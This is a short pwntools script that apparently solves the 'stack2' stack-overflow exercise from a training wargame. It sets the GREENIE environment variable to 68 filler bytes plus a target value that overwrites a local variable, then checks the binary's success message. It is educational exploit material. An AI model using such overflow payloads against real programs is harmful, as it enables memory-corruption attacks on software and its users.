from pwn import *
import os


# 1. info
context.log_level = 'debug'
e = ELF("../stack2")
"""
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
"""

# os set env
payload = 'a' * 68 + '\x0a\x0d\x0a\x0d'
os.environ['GREENIE'] = payload


# 2. connect
p = process("../stack2")
message = p.recvline()

FLAG = b'you have correctly modified the variable'
if FLAG in message:
    print(FLAG)